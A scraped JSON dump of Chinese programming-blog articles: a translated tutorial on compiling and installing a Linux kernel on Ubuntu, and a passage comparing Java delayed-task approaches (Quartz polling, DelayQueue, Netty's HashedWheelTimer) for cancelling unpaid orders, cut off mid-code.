,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n,\r\n\t\r\n\t,\r\n\t关于作者：,tsteho,\r\n\t,\r\n\t,\r\n\t\t,\r\n\t\t\t,\r\n\t\t,\r\n\t,\r\n\r\n    ,\r\n\r\n        ,\r\n            Python爱好者        ,\r\n        ,\r\n            , 个人主页, ·\r\n            , 我的文章,\r\n\r\n             · , 13, · ,         ,\r\n    ,\r\n\t,\r\n,\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/113954/", "url_object_id": "cda2e6399ff30560f3a49b7fb8c7280a", "front_image_path": "full/c387e396af4df71c22f480eba98289a1e8a86b87.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "如何编译 Linux 内核", "create_time": "2018/05/25", "vote": "2", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Jack Wallen,   译文出处：,Linux中国/Luke,   ,曾经有一段时间，升级 Linux 内核让很多用户打心里有所畏惧。在那个时候，升级内核包含了很多步骤，也需要很多时间。现在，内核的安装可以轻易地通过像 ,apt, 这样的包管理器来处理。通过添加特定的仓库，你能很轻易地安装实验版本的或者指定版本的内核（比如针对音频产品的实时内核）。,\n,考虑一下，既然升级内核如此容易，为什么你不愿意自行编译一个呢？这里列举一些可能的原因：,\n,\n,你想要简单了解编译内核的过程,\n,你需要启用或者禁用内核中特定的选项，因为它们没有出现在标准选项里,\n,你想要启用标准内核中可能没有添加的硬件支持,\n,你使用的发行版需要你编译内核,\n,你是一个学生，而编译内核是你的任务,\n,\n,不管出于什么原因，懂得如何编译内核是非常有用的，而且可以被视作一个通行权。当我第一次编译一个新的 Linux 内核（那是很久以前了），然后尝试从它启动，我从中（系统马上就崩溃了，然后不断地尝试和失败）感受到一种特定的兴奋。,\n,既然这样，让我们来实验一下编译内核的过程。我将使用 Ubuntu 16.04 Server 来进行演示。在运行了一次常规的 ,sudo apt upgrade, 之后，当前安装的内核版本是 ,4.4.0-121,。我想要升级内核版本到 ,4.17,， 让我们小心地开始吧。,\n,有一个警告：强烈建议你在虚拟机里实验这个过程。基于虚拟机，你总能创建一个快照，然后轻松地从任何问题中回退出来。不要在产品机器上使用这种方式升级内核，除非你知道你在做什么。,\n,下载内核,\n,我们要做的第一件事是下载内核源码。在 ,Kernel.org, 找到你要下载的所需内核的 URL。找到 URL 之后，使用如下命令（我以 ,4.17 RC2, 内核为例） 来下载源码文件:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nwget https://git.kernel.org/torvalds/t/linux-4.17-rc2.tar.gz\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,wget ,https,:,//git.kernel.org/torvalds/t/linux-4.17-rc2.tar.gz, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在下载期间，有一些事需要去考虑。,\n,安装需要的环境,\n,为了编译内核，我们首先得安装一些需要的环境。这可以通过一个命令来完成：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,apt,-,get ,install ,git ,fakeroot ,build,-,essential ,ncurses,-,dev ,xz,-,utils ,libssl,-,dev ,bc ,flex ,libelf,-,dev ,bison, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,务必注意：你将需要至少 128GB 的本地可用磁盘空间来完成内核的编译过程。因此你必须确保有足够的空间。,\n,解压源码,\n,在新下载的内核所在的文件夹下，使用该命令来解压内核：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ntar xvzf linux-4.17-rc2.tar.gz\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,tar ,xvzf ,linux,-,4.17,-,rc2,.,tar,.,gz, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用命令 ,cd linux-4.17-rc2, 进入新生成的文件夹。,\n,配置内核,\n,在正式编译内核之前，我们首先必须配置需要包含哪些模块。实际上，有一些非常简单的方式来配置。使用一个命令，你能拷贝当前内核的配置文件，然后使用可靠的 ,menuconfig, 命令来做任何必要的更改。使用如下命令来完成：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncp /boot/config-$(uname -r) .config\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,cp, ,/,boot,/,config,-,$,(,uname, ,-,r,), ,.,config, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在你有一个配置文件了，输入命令 ,make menuconfig,。该命令将打开一个配置工具（图 1），它可以让你遍历每个可用模块，然后启用或者禁用你需要或者不需要的模块。,\n,\n,图 1: 运行中的 ,make menuconfig,\n,很有可能你会禁用掉内核中的一个重要部分，所以在 ,menuconfig, 期间小心地一步步进行。如果你对某个选项不确定，不要去管它。或者更好的方法是使用我们拷贝的当前运行的内核的配置文件（因为我们知道它可以工作）。一旦你已经遍历了整个配置列表（它非常长），你就准备好开始编译了。,\n,编译和安装,\n,现在是时候去实际地编译内核了。第一步是使用 ,make, 命令去编译。调用 ,make, 命令然后回答必要的问题（图 2）。这些问题取决于你将升级的现有内核以及升级后的内核。相信我，将会有非常多的问题要回答，因此你得预留大量的时间。,\n,\n,图 2: 回答 ,make, 命令的问题,\n,回答了长篇累牍的问题之后，你就可以用如下的命令安装那些之前启用的模块：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nmake modules_install\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,make ,modules,_,install, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,又来了，这个命令将耗费一些时间，所以要么坐下来看着编译输出，或者去做些其他事（因为编译期间不需要你的输入）。可能的情况是，你想要去进行别的任务（除非你真的喜欢看着终端界面上飞舞而过的输出）。,\n,现在我们使用这个命令来安装内核：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo make install\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,make ,install, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,又一次，另一个将要耗费大量可观时间的命令。事实上，,make install, 命令将比 ,make modules_install, 命令花费更多的时间。去享用午餐，配置一个路由器，将 Linux 安装在一些服务器上，或者小睡一会吧。,\n,启用内核作为引导,\n,一旦 ,make install, 命令完成了，就是时候将内核启用来作为引导。使用这个命令来实现：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo update-initramfs -c -k 4.17-rc2\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,update,-,initramfs, ,-,c, ,-,k, ,4.17,-,rc2, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,当然，你需要将上述内核版本号替换成你编译完的。当命令执行完毕后，使用如下命令来更新 grub：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo update-grub\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,update,-,grub, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在你可以重启系统并且选择新安装的内核了。,\n,恭喜!,\n,你已经编译了一个 Linux 内核！它是一项耗费时间的活动；但是，最终你的 Linux 发行版将拥有一个定制的内核，同时你也将拥有一项被许多 Linux 管理员所倾向忽视的重要技能。,\n,从 Linux 基金会和 edX 提供的免费 ,“Introduction to Linux”, 课程来学习更多的 Linux 知识。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,2, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114047/", "url_object_id": "0f3f2c33552a25853e5c09c5da5cf3a9", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/03/4bae6998d00f180d42c7da716e3d0bb2.jpg"], "title": "分布式之延时任务方案解析", "create_time": "2018/05/20", "vote": "2", "bookmark": "5", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,孤独烟,   ,引言,\n,在开发中，往往会遇到一些关于延时任务的需求。例如,\n,\n,生成订单30分钟未支付，则自动取消,\n,生成订单60秒后,给用户发短信,\n,\n,对上述的任务，我们给一个专业的名字来形容，那就是,延时任务,。那么这里就会产生一个问题，这个,延时任务,和,定时任务,的区别究竟在哪里呢？一共有如下几点区别,\n,\n,定时任务有明确的触发时间，延时任务没有,\n,定时任务有执行周期，而延时任务在某事件触发后一段时间内执行，没有执行周期,\n,定时任务一般执行的是批处理操作是多个任务，而延时任务一般是单个任务,\n,\n,下面，我们以判断订单是否超时为例，进行方案分析,\n,方案分析,\n,(1)数据库轮询,\n,思路,\n,该方案通常是在小型项目中使用，即通过一个线程定时的去扫描数据库，通过订单时间来判断是否有超时的订单，然后进行update或delete等操作,\n,实现,\n,博主当年早期是用quartz来实现的(实习那会的事)，简单介绍一下,\nmaven项目引入一个依赖如下所示,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n    <dependency>\r\n        <groupId>org.quartz-scheduler</groupId>\r\n        <artifactId>quartz</artifactId>\r\n        <version>2.2.2</version>\r\n    </dependency>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,    ,<,dependency,>,        ,<,groupId,>,org,.,quartz,-,scheduler,<,/,groupId,>,        ,<,artifactId,>,quartz,<,/,artifactId,>,        ,<,version,>,2.2.2,<,/,version,>,    ,<,/,dependency,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,调用Demo类MyJob如下所示,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage com.rjzheng.delay1;\r\n\r\nimport org.quartz.JobBuilder;\r\nimport org.quartz.JobDetail;\r\nimport org.quartz.Scheduler;\r\nimport org.quartz.SchedulerException;\r\nimport org.quartz.SchedulerFactory;\r\nimport org.quartz.SimpleScheduleBuilder;\r\nimport org.quartz.Trigger;\r\nimport org.quartz.TriggerBuilder;\r\nimport org.quartz.impl.StdSchedulerFactory;\r\nimport org.quartz.Job;\r\nimport org.quartz.JobExecutionContext;\r\nimport org.quartz.JobExecutionException;\r\n\r\npublic class MyJob implements Job {\r\n    public void execute(JobExecutionContext context)\r\n            throws JobExecutionException {\r\n        System.out.println(\"要去数据库扫描啦。。。\");\r\n    }\r\n\r\n    public static void main(String[] args) throws Exception {\r\n        // 创建任务\r\n        JobDetail jobDetail = JobBuilder.newJob(MyJob.class)\r\n                .withIdentity(\"job1\", \"group1\").build();\r\n        // 创建触发器 每3秒钟执行一次\r\n        Trigger trigger = TriggerBuilder\r\n                .newTrigger()\r\n                .withIdentity(\"trigger1\", \"group3\")\r\n                .withSchedule(\r\n                        SimpleScheduleBuilder.simpleSchedule()\r\n                                .withIntervalInSeconds(3).repeatForever())\r\n                .build();\r\n        Scheduler scheduler = new StdSchedulerFactory().getScheduler();\r\n        // 将任务及其触发器放入调度器\r\n        scheduler.scheduleJob(jobDetail, trigger);\r\n        // 调度器开始调度任务\r\n        scheduler.start();\r\n    }\r\n}\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,com,.,rjzheng,.,delay1,;, ,import ,org,.,quartz,.,JobBuilder,;,import ,org,.,quartz,.,JobDetail,;,import ,org,.,quartz,.,Scheduler,;,import ,org,.,quartz,.,SchedulerException,;,import ,org,.,quartz,.,SchedulerFactory,;,import ,org,.,quartz,.,SimpleScheduleBuilder,;,import ,org,.,quartz,.,Trigger,;,import ,org,.,quartz,.,TriggerBuilder,;,import ,org,.,quartz,.,impl,.,StdSchedulerFactory,;,import ,org,.,quartz,.,Job,;,import ,org,.,quartz,.,JobExecutionContext,;,import ,org,.,quartz,.,JobExecutionException,;, ,public, ,class, ,MyJob, ,implements, ,Job, ,{,    ,public, ,void, ,execute,(,JobExecutionContext ,context,),            ,throws, ,JobExecutionException, ,{,        ,System,.,out,.,println,(,\"要去数据库扫描啦。。。\",),;,    ,}, ,    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,throws, ,Exception, ,{,        ,// 创建任务,        ,JobDetail ,jobDetail, ,=, ,JobBuilder,.,newJob,(,MyJob,.,class,),                ,.,withIdentity,(,\"job1\",,, ,\"group1\",),.,build,(,),;,        ,// 创建触发器 每3秒钟执行一次,        ,Trigger ,trigger, ,=, ,TriggerBuilder,                ,.,newTrigger,(,),                ,.,withIdentity,(,\"trigger1\",,, ,\"group3\",),                ,.,withSchedule,(,                        ,SimpleScheduleBuilder,.,simpleSchedule,(,),                                ,.,withIntervalInSeconds,(,3,),.,repeatForever,(,),),                ,.,build,(,),;,        ,Scheduler ,scheduler, ,=, ,new, ,StdSchedulerFactory,(,),.,getScheduler,(,),;,        ,// 将任务及其触发器放入调度器,        ,scheduler,.,scheduleJob,(,jobDetail,,, ,trigger,),;,        ,// 调度器开始调度任务,        ,scheduler,.,start,(,),;,    ,},}, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行代码，可发现每隔3秒，输出如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n要去数据库扫描啦。。。,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,要去数据库扫描啦。。。,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,优缺点,\n,优点:简单易行，支持集群操作,\n缺点:(1)对服务器内存消耗大,\n(2)存在延迟，比如你每隔3分钟扫描一次，那最坏的延迟时间就是3分钟,\n(3)假设你的订单有几千万条，每隔几分钟这样扫描一次，数据库损耗极大,\n,(2)JDK的延迟队列,\n,思路,\n,该方案是利用JDK自带的DelayQueue来实现，这是一个无界阻塞队列，该队列只有在延迟期满的时候才能从中获取元素，放入DelayQueue中的对象，是必须实现Delayed接口的。,\nDelayedQueue实现工作流程如下图所示,\n,\n,其中Poll():获取并移除队列的超时元素，没有则返回空,\ntake():获取并移除队列的超时元素，如果没有则wait当前线程，直到有元素满足超时条件，返回结果。,\n,实现,\n,定义一个类OrderDelay实现Delayed，代码如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage com.rjzheng.delay2;\r\n\r\nimport java.util.concurrent.Delayed;\r\nimport java.util.concurrent.TimeUnit;\r\n\r\npublic class OrderDelay implements Delayed {\r\n    \r\n    private String orderId;\r\n    private long timeout;\r\n\r\n    OrderDelay(String orderId, long timeout) {\r\n        this.orderId = orderId;\r\n        this.timeout = timeout + System.nanoTime();\r\n    }\r\n\r\n    public int compareTo(Delayed other) {\r\n        if (other == this)\r\n            return 0;\r\n        OrderDelay t = (OrderDelay) other;\r\n        long d = (getDelay(TimeUnit.NANOSECONDS) - t\r\n                .getDelay(TimeUnit.NANOSECONDS));\r\n        return (d == 0) ? 0 : ((d < 0) ? -1 : 1);\r\n    }\r\n\r\n    // 返回距离你自定义的超时时间还有多少\r\n    public long getDelay(TimeUnit unit) {\r\n        return unit.convert(timeout - System.nanoTime(), TimeUnit.NANOSECONDS);\r\n    }\r\n\r\n    void print() {\r\n        System.out.println(orderId+\"编号的订单要删除啦。。。。\");\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,com,.,rjzheng,.,delay2,;, ,import ,java,.,util,.,concurrent,.,Delayed,;,import ,java,.,util,.,concurrent,.,TimeUnit,;, ,public, ,class, ,OrderDelay, ,implements, ,Delayed, ,{,    ,    ,private, ,String, ,orderId,;,    ,private, ,long, ,timeout,;, ,    ,OrderDelay,(,String, ,orderId,,, ,long, ,timeout,), ,{,        ,this,.,orderId, ,=, ,orderId,;,        ,this,.,timeout, ,=, ,timeout, ,+, ,System,.,nanoTime,(,),;,    ,}, ,    ,public, ,int, ,compareTo,(,Delayed ,other,), ,{,        ,if, ,(,other, ,==, ,this,),            ,return, ,0,;,        ,OrderDelay, ,t, ,=, ,(,OrderDelay,), ,other,;,        ,long, ,d, ,=, ,(,getDelay,(,TimeUnit,.,NANOSECONDS,), ,-, ,t,                ,.,getDelay,(,TimeUnit,.,NANOSECONDS,),),;,        ,return, ,(,d, ,==, ,0,), ,?, ,0, ,:, ,(,(,d, ,<, ,0,), ,?, ,-,1, ,:, ,1,),;,    ,}, ,    ,// 返回距离你自定义的超时时间还有多少,    ,public, ,long, ,getDelay,(,TimeUnit ,unit,), ,{,        ,return, ,unit,.,convert,(,timeout, ,-, ,System,.,nanoTime,(,),,, ,TimeUnit,.,NANOSECONDS,),;,    ,}, ,    ,void, ,print,(,), ,{,        ,System,.,out,.,println,(,orderId,+,\"编号的订单要删除啦。。。。\",),;,    ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行的测试Demo为，我们设定延迟时间为3秒,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage com.rjzheng.delay2;\r\n\r\nimport java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.concurrent.DelayQueue;\r\nimport java.util.concurrent.TimeUnit;\r\n\r\npublic class DelayQueueDemo {\r\n     public static void main(String[] args) {  \r\n            // TODO Auto-generated method stub  \r\n            List<String> list = new ArrayList<String>();  \r\n            list.add(\"00000001\");  \r\n            list.add(\"00000002\");  \r\n            list.add(\"00000003\");  \r\n            list.add(\"00000004\");  \r\n            list.add(\"00000005\");  \r\n            DelayQueue<OrderDelay> queue = new DelayQueue<OrderDelay>();  \r\n            long start = System.currentTimeMillis();  \r\n            for(int i = 0;i<5;i++){  \r\n                //延迟三秒取出\r\n                queue.put(new OrderDelay(list.get(i),  \r\n                        TimeUnit.NANOSECONDS.convert(3, TimeUnit.SECONDS)));  \r\n                    try {  \r\n                         queue.take().print();  \r\n                         System.out.println(\"After \" +   \r\n                                 (System.currentTimeMillis()-start) + \" MilliSeconds\");  \r\n                } catch (InterruptedException e) {  \r\n                    // TODO Auto-generated catch block  \r\n                    e.printStackTrace();  \r\n                }  \r\n            }  \r\n        }  \r\n    \r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,com,.,rjzheng,.,delay2,;, ,import ,java,.,util,.,ArrayList,;,import ,java,.,util,.,List,;,import ,java,.,util,.,concurrent,.,DelayQueue,;,import ,java,.,util,.,concurrent,.,TimeUnit,;, ,public, ,class, ,DelayQueueDemo, ,{,     ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,{,  ,            ,// TODO Auto-generated method stub  ,            ,List,<,String,>, ,list, ,=, ,new, ,ArrayList,<,String,>,(,),;,  ,            ,list,.,add,(,\"00000001\",),;,  ,            ,list,.,add,(,\"00000002\",),;,  ,            ,list,.,add,(,\"00000003\",),;,  ,            ,list,.,add,(,\"00000004\",),;,  ,            ,list,.,add,(,\"00000005\",),;,  ,            ,DelayQueue,<,OrderDelay,>, ,queue, ,=, ,new, ,DelayQueue,<,OrderDelay,>,(,),;,  ,            ,long, ,start, ,=, ,System,.,currentTimeMillis,(,),;,  ,            ,for,(,int, ,i, ,=, ,0,;,i,<,5,;,i,++,),{,  ,                ,//延迟三秒取出,                ,queue,.,put,(,new, ,OrderDelay,(,list,.,get,(,i,),,,  ,                        ,TimeUnit,.,NANOSECONDS,.,convert,(,3,,, ,TimeUnit,.,SECONDS,),),),;,  ,                    ,try, ,{,  ,                         ,queue,.,take,(,),.,print,(,),;,  ,                         ,System,.,out,.,println,(,\"After \", ,+,   ,                                 ,(,System,.,currentTimeMillis,(,),-,start,), ,+, ,\" MilliSeconds\",),;,  ,                ,}, ,catch, ,(,InterruptedException, ,e,), ,{,  ,                    ,// TODO Auto-generated catch block  ,                    ,e,.,printStackTrace,(,),;,  ,                ,},  ,            ,},  ,        ,},  ,    ,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,输出如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n00000001编号的订单要删除啦。。。。\r\nAfter 3003 MilliSeconds\r\n00000002编号的订单要删除啦。。。。\r\nAfter 6006 MilliSeconds\r\n00000003编号的订单要删除啦。。。。\r\nAfter 9006 MilliSeconds\r\n00000004编号的订单要删除啦。。。。\r\nAfter 12008 MilliSeconds\r\n00000005编号的订单要删除啦。。。。\r\nAfter 15009 MilliSeconds,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,00000001,编号的订单要删除啦。。。。,After, ,3003, ,MilliSeconds,00000002,编号的订单要删除啦。。。。,After, ,6006, ,MilliSeconds,00000003,编号的订单要删除啦。。。。,After, ,9006, ,MilliSeconds,00000004,编号的订单要删除啦。。。。,After, ,12008, ,MilliSeconds,00000005,编号的订单要删除啦。。。。,After, ,15009, ,MilliSeconds,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,可以看到都是延迟3秒，订单被删除,\n,优缺点,\n,优点:效率高,任务触发时间延迟低。,\n缺点:(1)服务器重启后，数据全部消失，怕宕机,\n(2)集群扩展相当麻烦,\n(3)因为内存条件限制的原因，比如下单未付款的订单数太多，那么很容易就出现OOM异常,\n(4)代码复杂度较高,\n,(3)时间轮算法,\n,思路,\n,先上一张时间轮的图(这图到处都是啦),\n,\n,时间轮算法可以类比于时钟，如上图箭头（指针）按某一个方向按固定频率轮动，每一次跳动称为一个 tick。这样可以看出定时轮由个3个重要的属性参数，ticksPerWheel（一轮的tick数），tickDuration（一个tick的持续时间）以及 timeUnit（时间单位），例如当ticksPerWheel=60，tickDuration=1，timeUnit=秒，这就和现实中的始终的秒针走动完全类似了。,\n,如果当前指针指在1上面，我有一个任务需要4秒以后执行，那么这个执行的线程回调或者消息将会被放在5上。那如果需要在20秒之后执行怎么办，由于这个环形结构槽数只到8，如果要20秒，指针需要多转2圈。位置是在2圈之后的5上面（20 % 8 + 1）,\n,实现,\n,我们用Netty的HashedWheelTimer来实现,\n给Pom加上下面的依赖,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n        <dependency>\r\n            <groupId>io.netty</groupId>\r\n            <artifactId>netty-all</artifactId>\r\n            <version>4.1.24.Final</version>\r\n        </dependency>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,        ,<,dependency,>,            ,<,groupId,>,io,.,netty,<,/,groupId,>,            ,<,artifactId,>,netty,-,all,<,/,artifactId,>,            ,<,version,>,4.1.24.Final,<,/,version,>,        ,<,/,dependency,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,测试代码HashedWheelTimerTest如下所示,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npackage com.rjzheng.delay3;\r\n\r\nimport io.netty.util.HashedWheelTimer;\r\nimport io.netty.util.Timeout;\r\nimport io.netty.util.Timer;\r\nimport io.netty.util.TimerTask;\r\n\r\nimport java.util.concurrent.TimeUnit;\r\n\r\npublic class HashedWheelTimerTest {\r\n    static class MyTimerTask implements TimerTask{\r\n        boolean flag;\r\n        public MyTimerTask(boolean flag){\r\n            this.flag = flag;\r\n        }\r\n        public void run(Timeout timeout) throws Exception {\r\n            // TODO Auto-generated method stub\r\n             System.out.println(\"要去数据库删除订单了。。。。\");\r\n             this.flag =false;\r\n        }\r\n    }\r\n    public static void main(String[] argv) {\r\n        MyTimerTask timerTask = new MyTimerTask(true);\r\n        Timer timer = new HashedWheelTimer();\r\n        timer.newTimeout(timerTask, 5, TimeUnit.SECONDS);\r\n        int i = 1;\r\n        while(timerTask.flag){\r\n            try {\r\n                Thread.sleep(1000);\r\n            } catch (InterruptedException e) {\r\n                // TODO Auto-generated catch block\r\n                e.printStackTrace();\r\n            }\r\n            System.out.println(i+\"秒过去了\");\r\n            i++;\r\n        }\r\n    }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,package, ,com,.,rjzheng,.,delay3,;, ,import ,io,.,netty,.,util,.,HashedWheelTimer,;,import ,io,.,netty,.,util,.,Timeout,;,import ,io,.,netty,.,util,.,Timer,;,import ,io,.,netty,.,util,.,TimerTask,;, ,import ,java,.,util,.,concurrent,.,TimeUnit,;, ,public, ,class, ,HashedWheelTimerTest, ,{,    ,static, ,class, ,MyTimerTask, ,implements, ,TimerTask,{,        ,boolean, ,flag,;,        ,public, ,MyTimerTask,(,boolean, ,flag,),{,            ,this,.,flag, ,=, ,flag,;,        ,},        ,public, ,void, ,run,(,Timeout ,timeout,), ,throws, ,Exception, ,{,            ,// TODO Auto-generated method stub,             ,System,.,out,.,println,(,\"要去数据库删除订单了。。。。\",),;,             ,this,.,flag, ,=,false,;,        ,},    ,},    ,public, ,static, ,void, ,main,(,String,[,], ,argv,), ,{,        ,MyTimerTask ,timerTask, ,=, ,new, ,MyTimerTask,(,true,),;,        ,Timer ,timer, ,=, ,new, ,HashedWheelTimer,(,),;,        ,timer,.,newTimeout,(,timerTask,,, ,5,,, ,TimeUnit,.,SECONDS,),;,        ,int, ,i, ,=, ,1,;,        ,while,(,timerTask,.,flag,),{,            ,try, ,{,                ,Thread,.,sleep,(,1000,),;,            ,}, ,catch, ,(,InterruptedException, ,e,), ,{,                ,// TODO Auto-generated catch block,                